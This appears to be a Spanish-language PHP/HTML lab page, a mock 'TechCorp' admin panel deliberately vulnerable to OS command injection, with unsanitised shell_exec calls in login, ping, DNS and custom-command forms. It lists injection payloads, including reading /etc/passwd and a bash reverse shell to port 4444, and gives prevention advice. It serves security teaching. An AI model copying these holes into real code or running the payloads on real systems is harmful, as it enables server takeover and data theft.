<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema de Administración - TechCorp</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            width: 100%;
            max-width: 1000px;
            display: flex;
            min-height: 600px;
        }
        
        .left-panel {
            background: linear-gradient(135deg, #2c3e50 0%, #1a1a2e 100%);
            color: white;
            padding: 40px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        
        .right-panel {
            padding: 40px;
            flex: 2;
            overflow-y: auto;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }
        
        h2 {
            color: #667eea;
            margin-bottom: 30px;
            font-size: 22px;
        }
        
        h3 {
            color: #764ba2;
            margin: 20px 0 10px;
            padding-bottom: 10px;
            border-bottom: 2px solid #f0f0f0;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: white;
            font-size: 32px;
            margin-bottom: 5px;
        }
        
        .logo span {
            color: #667eea;
        }
        
        .tagline {
            text-align: center;
            color: #b3b3cc;
            font-size: 14px;
            margin-bottom: 40px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
        }
        
        input[type="text"],
        input[type="password"],
        select,
        textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e1e1;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input:focus,
        select:focus,
        textarea:focus {
            border-color: #667eea;
            outline: none;
        }
        
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            width: 100%;
            margin-top: 10px;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        
        .section {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border-left: 4px solid #667eea;
        }
        
        .result-box {
            background: #1a1a2e;
            color: #00ff9d;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .nav-tabs {
            display: flex;
            border-bottom: 2px solid #e1e1e1;
            margin-bottom: 20px;
        }
        
        .tab {
            padding: 10px 20px;
            cursor: pointer;
            border-bottom: 3px solid transparent;
            font-weight: 600;
            color: #666;
        }
        
        .tab.active {
            color: #667eea;
            border-bottom-color: #667eea;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .payload-box {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }
        
        .payload-box code {
            background: #2d3436;
            color: #dfe6e9;
            padding: 5px 10px;
            border-radius: 5px;
            display: inline-block;
            margin: 3px;
            font-size: 13px;
        }
        
        .user-info {
            background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
            color: white;
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .alert {
            padding: 12px;
            border-radius: 8px;
            margin: 10px 0;
        }
        
        .alert-danger {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Panel izquierdo -->
        <div class="left-panel">
            <div class="logo">
                <h1>Tech<span>Corp</span></h1>
                <p>Sistema de Administración</p>
            </div>
            <div class="tagline">
                <p>Panel de Control Administrativo</p>
                <p>v2.1.4</p>
            </div>
            
            <h3>🔐 Módulos Disponibles</h3>
            <ul style="margin-top: 20px; padding-left: 20px; color: #b3b3cc;">
                <li style="margin-bottom: 10px;">✓ Gestión de Usuarios</li>
                <li style="margin-bottom: 10px;">✓ Monitoreo del Sistema</li>
                <li style="margin-bottom: 10px;">✓ Herramientas de Red</li>
                <li style="margin-bottom: 10px;">✓ Backup y Restauración</li>
                <li style="margin-bottom: 10px;">✓ Reportes y Logs</li>
            </ul>
            
            <div style="margin-top: 40px; font-size: 12px; color: #666;">
                <p>⚠️ <strong>ADVERTENCIA LABORATORIO:</strong></p>
                <p>Este sistema contiene vulnerabilidades intencionales para fines educativos.</p>
            </div>
        </div>
        
        <!-- Panel derecho -->
        <div class="right-panel">
            <!-- Tabs de navegación -->
            <div class="nav-tabs">
                <div class="tab active" onclick="switchTab('login')">🔐 Login</div>
                <div class="tab" onclick="switchTab('tools')">🛠️ Herramientas</div>
                <div class="tab" onclick="switchTab('system')">💻 Sistema</div>
                <div class="tab" onclick="switchTab('help')">❓ Ayuda</div>
            </div>
            
            <!-- Contenido de Login -->
            <div id="login" class="tab-content active">
                <h1>Acceso al Sistema</h1>
                <h2>Autenticación de Administrador</h2>
                
                <?php
                session_start();
                
                // Vulnerabilidad 1: Login con command injection
                if (isset($_POST['login'])) {
                    $username = $_POST['username'];
                    $password = $_POST['password'];
                    
                    echo '<div class="alert alert-danger">';
                    echo "<strong>DEBUG:</strong> Usuario: $username | Pass: $password<br>";
                    
                    // VULNERABILIDAD CRÍTICA: Ejecuta comando directamente
                    $command = "echo 'Intentando login con: $username'";
                    echo "<strong>Comando ejecutado:</strong> " . htmlspecialchars($command) . "<br>";
                    
                    $output = shell_exec($command);
                    echo "<strong>Resultado:</strong> $output";
                    
                    // Simulación de validación (siempre falla excepto con payload)
                    if ($username == 'admin' && $password == 'password123') {
                        $_SESSION['user'] = 'admin';
                        echo '<div class="alert alert-success">Login exitoso como admin</div>';
                    } else {
                        // MÁS VULNERABILIDAD: El fallo ejecuta comando
                        $check_command = "echo 'Login fallido: $username'";
                        shell_exec($check_command);
                        echo '<div class="alert alert-danger">Credenciales incorrectas</div>';
                    }
                    echo '</div>';
                }
                
                // Mostrar info si hay sesión
                if (isset($_SESSION['user'])) {
                    echo '<div class="user-info">';
                    echo "✅ Usuario autenticado: <strong>" . $_SESSION['user'] . "</strong>";
                    echo ' | <a href="?logout=1" style="color: white; text-decoration: underline;">Cerrar sesión</a>';
                    echo '</div>';
                }
                ?>
                
                <form method="POST" action="">
                    <div class="form-group">
                        <label for="username">👤 Usuario:</label>
                        <input type="text" id="username" name="username" placeholder="admin" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="password">🔒 Contraseña:</label>
                        <input type="password" id="password" name="password" placeholder="password123" required>
                    </div>
                    
                    <button type="submit" name="login">🚀 Iniciar Sesión</button>
                </form>
                
                <div class="payload-box">
                    <strong>🎯 Payloads para probar en Login:</strong><br>
                    <code>admin; whoami</code>
                    <code>admin | id</code>
                    <code>`ls -la`</code>
                    <code>$(cat /etc/passwd)</code>
                </div>
            </div>
            
            <!-- Contenido de Herramientas -->
            <div id="tools" class="tab-content">
                <h1>🛠️ Herramientas del Sistema</h1>
                <h2>Utilidades de administración</h2>
                
                <?php
                // Vulnerabilidad 2: Ping tool
                if (isset($_POST['ping'])) {
                    $host = $_POST['host'];
                    
                    echo '<div class="section">';
                    echo "<h3>📡 Ping a: " . htmlspecialchars($host) . "</h3>";
                    
                    // VULNERABILIDAD: Sin validación
                    $command = "ping -c 4 " . $host . " 2>&1";
                    $output = shell_exec($command);
                    
                    echo '<div class="result-box">';
                    echo htmlspecialchars($output) ?: "No hay respuesta";
                    echo '</div>';
                    echo '</div>';
                }
                
                // Vulnerabilidad 3: DNS Lookup
                if (isset($_POST['nslookup'])) {
                    $domain = $_POST['domain'];
                    
                    echo '<div class="section">';
                    echo "<h3>🔍 DNS Lookup: " . htmlspecialchars($domain) . "</h3>";
                    
                    // VULNERABILIDAD: Ejecución directa
                    $command = "nslookup " . $domain . " 2>&1";
                    $output = shell_exec($command);
                    
                    echo '<div class="result-box">';
                    echo htmlspecialchars($output) ?: "No se encontró el dominio";
                    echo '</div>';
                    echo '</div>';
                }
                ?>
                
                <div class="section">
                    <h3>📡 Prueba de Conectividad</h3>
                    <form method="POST">
                        <div class="form-group">
                            <label for="host">Dirección IP o Host:</label>
                            <input type="text" id="host" name="host" placeholder="google.com o 8.8.8.8" required>
                        </div>
                        <button type="submit" name="ping">✅ Ejecutar Ping</button>
                    </form>
                    
                    <div class="payload-box">
                        <strong>Payloads para Ping:</strong><br>
                        <code>google.com; ls -la</code>
                        <code>127.0.0.1 && whoami</code>
                        <code>8.8.8.8 | cat /etc/passwd</code>
                    </div>
                </div>
                
                <div class="section">
                    <h3>🔍 Busqueda DNS</h3>
                    <form method="POST">
                        <div class="form-group">
                            <label for="domain">Nombre de Dominio:</label>
                            <input type="text" id="domain" name="domain" placeholder="ejemplo.com" required>
                        </div>
                        <button type="submit" name="nslookup">🔎 Buscar DNS</button>
                    </form>
                    
                    <div class="payload-box">
                        <strong>Payloads para DNS:</strong><br>
                        <code>google.com && pwd</code>
                        <code>example.com;ps aux</code>
                        <code>`id`.com</code>
                    </div>
                </div>
            </div>
            
            <!-- Contenido de Sistema -->
            <div id="system" class="tab-content">
                <h1>💻 Información del Sistema</h1>
                <h2>Monitoreo y Estadísticas</h2>
                
                <?php
                // Vulnerabilidad 4: Comandos personalizados
                if (isset($_POST['custom_cmd'])) {
                    $cmd = $_POST['custom_command'];
                    
                    echo '<div class="section">';
                    echo "<h3>⚡ Comando ejecutado: " . htmlspecialchars($cmd) . "</h3>";
                    
                    // VULNERABILIDAD CRÍTICA: Ejecución directa de comando
                    $output = shell_exec($cmd . " 2>&1");
                    
                    echo '<div class="result-box">';
                    echo htmlspecialchars($output) ?: "Comando ejecutado (sin output)";
                    echo '</div>';
                    echo '</div>';
                }
                ?>
                
                <div class="section">
                    <h3>📊 Estado del Sistema</h3>
                    <?php
                    // Ejecutar algunos comandos de sistema
                    $commands = [
                        "whoami" => "Usuario actual",
                        "pwd" => "Directorio actual",
                        "uname -a" => "Información del sistema",
                        "df -h" => "Espacio en disco",
                        "free -h" => "Memoria libre"
                    ];
                    
                    foreach ($commands as $cmd => $desc) {
                        echo "<h4>$desc:</h4>";
                        $output = shell_exec($cmd . " 2>&1");
                        echo '<div class="result-box">' . htmlspecialchars($output) . '</div>';
                    }
                    ?>
                </div>
                
                <div class="section">
                    <h3>⚡ Comando Personalizado (Solo Admin)</h3>
                    <form method="POST">
                        <div class="form-group">
                            <label for="custom_command">Comando a ejecutar:</label>
                            <input type="text" id="custom_command" name="custom_command" 
                                   placeholder="Ej: ls -la /var/www" required>
                        </div>
                        <button type="submit" name="custom_cmd">🚀 Ejecutar Comando</button>
                    </form>
                    
                    <div class="payload-box">
                        <strong>🎯 Comandos peligrosos para probar:</strong><br>
                        <code>id; whoami; pwd</code><br>
                        <code>cat /etc/passwd</code><br>
                        <code>ps aux | grep apache</code><br>
                        <code>find / -type f -name '*.php' 2>/dev/null | head -20</code><br>
                        <code>bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'</code>
                    </div>
                </div>
            </div>
            
            <!-- Contenido de Ayuda -->
            <div id="help" class="tab-content">
                <h1>❓ Centro de Ayuda</h1>
                <h2>Guía de uso y seguridad</h2>
                
                <div class="section">
                    <h3>🎯 ¿Qué es Command Injection?</h3>
                    <p>Command Injection es una vulnerabilidad que permite a un atacante ejecutar comandos arbitrarios en el sistema operativo del servidor.</p>
                    
                    <h3>🔍 ¿Cómo funciona?</h3>
                    <p>Cuando una aplicación pasa datos no confiables a un intérprete de comandos del sistema, un atacante puede inyectar comandos maliciosos.</p>
                    
                    <h3>⚠️ Vectores de ataque en esta app:</h3>
                    <ul style="margin-left: 20px; margin-top: 10px;">
                        <li>1. Formulario de Login (username/password)</li>
                        <li>2. Herramienta de Ping</li>
                        <li>3. Búsqueda DNS</li>
                        <li>4. Comando personalizado</li>
                    </ul>
                    
                    <h3>🛡️ Cómo prevenir:</h3>
                    <div class="payload-box" style="background: #d4edda; color: #155724;">
                        <code>escapeshellarg()</code> - Escapa argumentos completos<br>
                        <code>escapeshellcmd()</code> - Escapa caracteres peligrosos<br>
                        <code>preg_match()</code> - Validar con expresiones regulares<br>
                        <code>disable_functions</code> - Desactivar funciones peligrosas en php.ini<br>
                        <code>sudoers</code> - Limitar permisos del usuario web
                    </div>
                    
                    <h3>📚 Recursos de aprendizaje:</h3>
                    <ul style="margin-left: 20px;">
                        <li><a href="https://owasp.org/www-community/attacks/Command_Injection">OWASP Command Injection</a></li>
                        <li><a href="https://portswigger.net/web-security/os-command-injection">PortSwigger OS Command Injection</a></li>
                        <li><a href="https://www.acunetix.com/websitesecurity/os-command-injection/">Acunetix Command Injection</a></li>
                    </ul>
                </div>
                
                <div class="section">
                    <h3>🔄 Reiniciar Laboratorio</h3>
                    <form method="POST">
                        <button type="submit" name="reset" style="background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);">
                            🔄 Reiniciar Sesión
                        </button>
                    </form>
                    <?php
                    if (isset($_POST['reset'])) {
                        session_destroy();
                        echo '<div class="alert alert-success">Sesión reiniciada. Recarga la página.</div>';
                    }
                    ?>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        function switchTab(tabName) {
            // Ocultar todos los tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remover active de todos los botones
            document.querySelectorAll('.tab').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Mostrar tab seleccionado
            document.getElementById(tabName).classList.add('active');
            
            // Activar botón
            event.target.classList.add('active');
        }
        
        // Auto-ejecutar comando de ejemplo al cargar
        window.onload = function() {
            console.log("Laboratorio de Command Injection cargado");
            console.log("Prueba estos payloads:");
            console.log("1. admin; whoami");
            console.log("2. google.com && id");
            console.log("3. `cat /etc/passwd`");
        }
    </script>
</body>
</html>